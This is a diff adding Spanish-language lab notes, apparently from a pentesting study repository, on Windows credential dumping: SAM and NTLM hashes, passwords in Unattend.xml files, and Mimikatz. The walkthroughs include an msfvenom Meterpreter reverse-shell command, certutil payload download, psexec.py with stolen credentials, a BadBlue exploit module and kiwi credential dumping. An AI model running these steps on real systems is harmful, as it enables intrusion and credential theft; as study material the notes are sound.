@@ -7812,9 +7812,300 @@ Cuando el servidor RDP procesa ciertos paquetes del protocolo de enlace inicial 
 
 
 
+<!--------------------------------------------------##  Tipos de ataque de Contraseña --------------------------------------------------------------------------->
 
 
-<!--------------------------------------------------##  Tipos de ataque de COntraseña --------------------------------------------------------------------------->
+
+<h2> :arrow_right:  Volcado de credenciales de Windows </h2>
+
+
+<h2> :no_entry:  Hashes de contraseñas de Windows</h2>
+
+
+<p> Windows almacena los hashes de contraseña en estas ubicaciones</p>
+
+
+
+<p> :pushpin: Cuentas locales — SAM Database (Security Accounts Manager - Administrador de cuentas de seguridad) <p>
+
+<p> Es la base de datos de Windows que almacena las cuentas de usuario locales y sus credenciales (hashes de contraseñas).</p>
+
+<p> Ubicación física:<b>C:\Windows\System32\config\SAM</b><p>
+
+
+  <p><b>Contenido</b><p>
+    <p> • Nombres de usuario y RID (Relative ID, ej. Administrator = 500) </p>
+    <p> • Hashes de contraseñas (NTLM; LM si está habilitado en sistemas antiguos) </p>
+    <p> • Grupos locales, SID, políticas de contraseñas locales</p>
+    <p> • Historial de hashes de contraseñas anteriores</p>
+
+<p><b>Nota</b> El Kernek de Windows NT mantiene bloqueado el archivo de la base de datos SAM por lo tanto los atacantes suelen utilizar tecnicas y herramientas en memoria para extraer los hashes de SAM del proceso LSASS<p>
+
+<p><b> LSASS (Local Security Authority Subsystem Service)</b> Es el proceso de Windows responsable de aplicar la política de seguridad y manejar la autenticación. Se ejecuta como lsass.exe con privilegios SYSTEM.</p>
+
+<p>En las versiones modernas de Windows la base de datos SAM esta encriptada con una clave SYSKEY, </p>
+
+<p>Es importante tener en cuenta que para realizar un volcado de hashes de la memoria se requiere contar con privilegios elevados o administrativos para interactuar con el proceso LSASS </p>
+
+
+
+<p><b>:radio_button: LM Hash (LanMan / LAN Manager Hash)</b></p>
+
+<p>Es el formato de hash de contraseñas más antiguo de Windows, usado desde OS/2 y Windows NT 3.x para compatibilidad con redes LAN Manager. Obsoleto e inseguro. </p>
+
+<p>El protocolo se utiliza para hashear las contraseñas de los usuarios de la siguiente forma  </p>
+    <p> • La contraseña se divide en dos fragmentos de siete caracteres </p>
+    <p> • Todos los caractares se convierten en mayuscula </p>
+    <p> • Cada fragmento se hashea por separado con el algoritmo DES</p>
+
+<p>El HASH LM se considera un protocolo debil y se puede decifrar facilmente</p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/rswFX6jN/401.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+<p><b>:radio_button: NTLM (NTHash)</b></p>
+
+<p> NTLM es una coleccionde protocolos de autenticacion que se utilizan en Windows para facilitar la autenticacion entre ordenadores, este proceso implica el usi de un nombre de usuario y contraseña validos</p>
+<p> Desde Windows visa en adelante se deshabilito el hash LM y se utiliza NTLM </p>
+
+<p><b>Versiones NTLM</b></p>
+  <p> • <b>1. NTLMv1 (Versión 1)</b> Es la versión más antigua y la más insegura. Fue diseñada para mejorar la seguridad sobre el antiguo protocolo LM (LAN Manager), pero hoy en día se considera extremadamente vulnerable. </p>
+
+  <p> • <b>2. NTLMv2 (Versión 2)</b> Es la versión que la mayoría de los sistemas operativos Windows modernos utilizan por defecto cuando Kerberos no está disponible o no es la opción preferida. Es vulnerable a ataques de Relay (NTLM Relay Attacks), donde un atacante intercepta una autenticación y la "retransmite" a otro servicio para ganar acceso sin conocer la contraseña real.</p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/ZRZ5Hvys/400.png" alt="Descripción de la imagen">
+  
+</p>
+
+<p> :pushpin: (Active Directory) — NTDS.dit </p>
+<p> :pushpin: Memoria — LSASS </p>
+<p> :pushpin: Caché de logon de dominio (DCC2) </p>
+
+
+
+<h2> :no_entry: Contraseñas en archivos de configuración de Windows</h2>
+
+<h3> Instalacion desatendida de windows </h3>
+
+
+<p> La utilidad de instalacion desatendida de Windows normalmente utiliza uno de los siguientes archivos de configuracion que contiene informacion de configuracion del sistema y de la cuenta de usuario </p>
+
+
+<p> :radio_button: <b>C:\Windows\Panther\Unattend.xml</b> </p>
+
+
+<p>  Un atacante o un administrador de sistemas podría encontrar información sensible como: </p>
+
+<p> • <b> Configuraciones de Partición:</b> Detalles sobre cómo se dividió el disco duro.</p>
+<p> • <b> Configuración de la Cuenta de Usuario:</b> Nombres de usuario creados durante la instalación.</p>
+<p> • <b> Configuración de Red:</b> Parámetros de IP, nombres de dominio o perfiles de red.</p>
+<p> • <b> Drivers:</b> Listado de controladores instalados durante el proceso </p>
+<p> • <b> Configuraciones de Región y Teclado:</b> Localización del sistema.</p>
+
+
+
+<p> :radio_button: <b>C:\Windows\Panther\Autounattend.xml</b> </p>
+
+<p> Al ser un archivo XML, contiene instrucciones que le dicen al instalador cómo debe configurarse el sistema sin intervención manual del usuario. Dependiendo de cómo se haya creado la imagen de instalación, podrías encontrar: </p>
+
+
+<p> • <b> Credenciales de Administrador:</b>  En configuraciones mal protegidas, se pueden encontrar contraseñas en texto plano para la cuenta de administrador local.</p>
+<p> • <b> Product Keys:</b> Claves de producto de Windows.</p>
+<p> • <b> Scripts de Post-instalación:</b> Comandos que se ejecutan automáticamente al terminar la instalación (útiles para configurar software o políticas de seguridad).</p>
+<p> • <b> Configuraciones de Seguridad:</b> Si se desactivaron ciertas características de seguridad durante el despliegue. </p>
+
+
+
+<p> Como medida de seguridad, las contraseñas almacenadas en el archivo de configuracion de la instalacion desatendida de Winwos pueden estar codificados en base64 </p>
+
+
+<p> Si un atacante logra acceso al sistema de archivos, la lectura de estos archivos XML puede revelar la arquitectura de la red, nombres de usuarios, métodos de autenticación y configuraciones críticas de la máquina. </p>
+
+
+<p> :radio_button: Pasos</p>
+
+
+<p> 1. Generar una carga util de interprete con MSF Venom </p>
+<p><b>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.39.2 LPORT=1234 -f exe >payload.exe</b></p>
+
+
+
+<p> 2. Configurar un servidor web simple para alojar el archivo payload.exe </p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/dVnYzS9d/402.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+<p> 3. En un escenario real se obtendra acceso al sistema objetivo a traves de un exploit o explotando una vulneravilidad en un servicio para esta demostracion se utilizara la utilidad <b> certutil -urlcache -f + direccion IP del servidor web/ el nombre del archivo y el nombre con el cual se va a guardar "" </b></p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/FF0wMBrx/403.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+
+
+<p> 4. Utilizar Metasploit </p>
+
+<p> Utilizar Multi-handler</p>
+<p> Configurar la carga util que se uso con anterioridad y los parametros adicionales</p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/cLZSrNHK/404.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+<p> 5. Ejecutar el archivo payload.exe que dejamos en el escritorio de Windows, para obtener la sesion de meterpreter </p>
+
+<p> La sesion de Meterpreter se encuentra abierta  </p>
+
+
+
+
+<p> 6. Buscar los archivos </p>
+
+<p> :radio_button: <b>C:\Windows\Panther\Unattend.xml</b> </p>
+<p> :radio_button: <b>C:\Windows\Panther\Autounattend.xml</b> </p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/HxfGmqRW/405.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+<p> 7. Descargar los archivos para visualizar su contenido </p>
+<p> Al validar su contenido podemos observar que contiene informacion relacionada a las instalacion de Windows  </p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/T3k4f85Z/406.png" alt="Descripción de la imagen">
+  
+</p>
+
+<p> En el apartado de AutoLogon encontramos el usuario <b>administrador</b> junto con su contraseña la cual se encuentra codificada en base 64 </p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/bvwdSnJy/407.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+<p> 8. Una vez obtenida la credenciales del administrador probarlas con <b>psexec.py</b></p>
+
+
+<p> Es una herramienta de línea de comandos escrita en Python que permite la ejecución remota de comandos en sistemas Windows.
+
+Es la implementación (basada en el protocolo de comunicación de Windows) de la herramienta original PsExec de la suite Sysinternals de Microsoft. Utiliza el protocolo SMB (Server Message Block) para conectarse a una máquina Windows remota, subir un ejecutable temporal y ejecutarlo con los privilegios del usuario proporcionado.</p>
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/fyG0xRPj/408.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+<p> Obtenemos una sesion shell de comandos. Adicionalmente podemos usar el modulo de psexec de Metasploit para obtener una sesion de meterpreter </p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
@@ -8877,15 +9168,281 @@ Mientras que la sesión de 32 bits te proporciona el acceso inicial necesario pa
 
 
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-------------------------------------------------- Access Token Impersonation  --------------------------------------------------------------------------->
+
+
+
+
+<h2> :no_entry:  BadSuccessor </h2>
+
+
+
+
+
+
+<p> :radio_button: Pasos</p>
+
+
+<p> Utilizar el script <b> Get-BadSuccessorOUPermissions.ps1 "https://github.com/akamai/BadSuccessor"</b> para identificar cuentas que pueden crear dMSA en sus unidades de organización (OU)  </p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 <h2> :arrow_right: Persistencia </h2>
 
 
 <h2> :arrow_right: Recolección de datos </h2>
 
 
+
+<!--------------------------------------------------## Movimiento lateral --------------------------------------------------------------------------->
+
+
+
 <h2> :arrow_right: Movimiento lateral</h2>
 
 
+
+<!--------------------------------------------------##  Dumping Hashes With Mimikatz --------------------------------------------------------------------------->
+
+
+
+<h2> :no_entry:  Dumping Hashes With Mimikatz / Volcando hashes con Mimikatz  </h2>
+
+
+<h3> Mimikatz </h3>
+
+
+<p> Es una de las herramientas más potentes y famosas en el arsenal de un auditor de seguridad o un atacante. Su función principal es la extracción de credenciales de la memoria de sistemas operativos Windows.</p>
+
+
+<p> Interactúa con el subsistema de seguridad de Windows (específicamente el proceso lsass.exe) para recuperar información sensible que el sistema mantiene en memoria para facilitar el inicio de sesión único (SSO) y la gestión de sesiones.</p>
+
+
+<p><b>lsass.exe: es el componente crítico de Windows encargado de gestionar la autenticación, las políticas de seguridad y los tokens de acceso de los usuarios; sin embargo, debido a que almacena información sensible como hashes y tickets de Kerberos en su memoria para facilitar el inicio de sesión, se convierte en el objetivo principal de herramientas como Mimikatz, las cuales buscan explotar su funcionamiento para realizar ataques de extracción de credenciales, escalada de privilegios y movimiento lateral dentro de una red. </b></p>
+
+
+
+
+<p> :radio_button:  Funciones principales </p>
+
+
+<p><b>1. Extracción de contraseñas en texto plano</b>En versiones antiguas de Windows Mimikatz puede extraer las contraseñas de los usuarios en texto plano directamente de la memoria. Esto permite al atacante ver la contraseña real que el usuario escribió en el teclado.</p>
+
+<p><b>2. Extracción de Hashes (NTLM)</b>En sistemas modernos donde el texto plano suele estar protegido, Mimikatz extrae los hashes NTLM.</p>
+
+<p><b>3. Ataques de tipo "Pass-the-Hash" (PtH)</b>Mimikatz permite utilizar un hash NTLM obtenido para autenticarse en otros servicios o máquinas de la red sin necesidad de conocer la contraseña original. El atacante simplemente "pasa el hash" para simular una sesión legítima.</p>
+
+<p><b>4. Ataques de Kerberos (Pass-the-Ticket)</b>Mimikatz puede manipular los tickets de Kerberos en entornos de dominio (Active Directory):</p>
+
+  <p><b> • Extracción de TGT (Ticket Granting Tickets) </b>Permite obtener los tickets que los usuarios usan para pedir acceso a recursos.</p>
+  <p><b> • Golden Ticket: </b>Mimikatz permite crear un ticket de Kerberos falso pero extremadamente poderoso que otorga acceso casi ilimitado y permanente a cualquier recurso del dominio, simulando ser un administrador de dominio.</p>
+  <p><b> • Silver Ticket</b>Similar al anterior, pero enfocado en servicios específicos (como CIFS o HTTP), permitiendo acceso a servicios concretos sin comprometer todo el dominio.</p>
+
+
+
+<p><b>5. Manipulación de privilegios y persistencia</b></p>
+
+  <p><b> • Escalar privilegios: </b> Obtener tokens de seguridad de otros usuarios.</p>
+  <p><b> • Inyectar credenciales:</b>Manipular la memoria para que el sistema crea que un usuario específico ha iniciado sesión.</p>
+
+<p><b> Nota: Mimikatz: Requiere privilegios elevados para ejecutarse correctamente la razon de esto es que el proceso lsass.exe es un proceso privilegiado </b></p>
+
+
+
+<p> :radio_button: Pasos</p>
+
+
+<p>1. Explotar un servicio vulnerable</p>
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/05JrCddP/409.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+<p>Podemos observar que en el puerto 80 tenemos en funcionamiento el servidor web <b> BadBlue 2.7</b> el cual es altamente vulnerable a varios fallos críticos de seguridad </p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/wBT4y28p/416.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+
+
+
+
+<p>2. Buscar en Metasploit si tenemos un modulo que nos permitar explotar este servidor y nos proporciones una sesion de Meterpreter </p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/L6XC7556/410.png" alt="Descripción de la imagen">
+  
+</p>
+
+<p>Tenemos como resultado dos exploit, en este caso vamos a utilizar la segunda opcion la cual se ajusta mas a la version del servicdor que vamos a explotar </p>
+
+<p><b> windows/http/badblue_passthru </b>  Este módulo aprovecha un desbordamiento del búfer de la pila en la funcionalidad PassThru de ext.dll en BadBlue 2.72b y versiones anteriores. </p>
+
+
+<p><b> Completar los parametros que requiere el modulo para su funcionamiento como la direccion IP de la victima </p>
+
+
+<p>3. Interactuar con la sesion de Meterpreter </p>
+
+
+<p>Logramos observar la version del sistema operativo que se esta ejecutando en el servidor de la victima y tambien nos permite validar que tenemos una carga utili de Meterpreter de 32 bits en un sistema de 64 </p>
+<p>Logramos obterner el ID de usuario que en este caso es el administrador </p>
+
+<p>Buscamos el ID del proceso lsassel cual vamos a migrar  </p>
+<p>Al recuperar nuevamente el ID del usuario logramos observar que ya contamos con los privilegios de SYSTEM que son los mas altos  </p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/CKBHHnvx/411.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+
+
+<p>4. Utilizar el modulo <b> KIWI</b></p>
+
+<p> Kiwi es el nombre con el que se identifica al módulo de post-explotación que integra las capacidades de Mimikatz.</p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/R0k8cBLQ/412.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+<p> Con el parametro <b> creds_all  </b> Recuperar todas las credenciales </p>
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/nLp9Ms69/413.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+
+<p> Con el parametro <b> lsa_dump_sam </b> Volcar LSA SAM </p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/Zn3wtD3S/414.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/DyrxxHnj/415.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+
+<p> Este comando permitira volcar todos los hashes NTLM para todas las cuentas de usuario </p>
+
+
+<p> Nota: Mimikatz es una herramienta nativa de Windows escrita en C, por lo que no se ejecuta directamente sobre el sistema de archivos de Linux.  Para utilizarla desde un entorno Kali Linux, la práctica estándar es instalar el paquete oficial desde los repositorios de Kali y luego transferir el binario a la máquina objetivo con Windows para ejecutarlo allí.  </p>
 
 
 
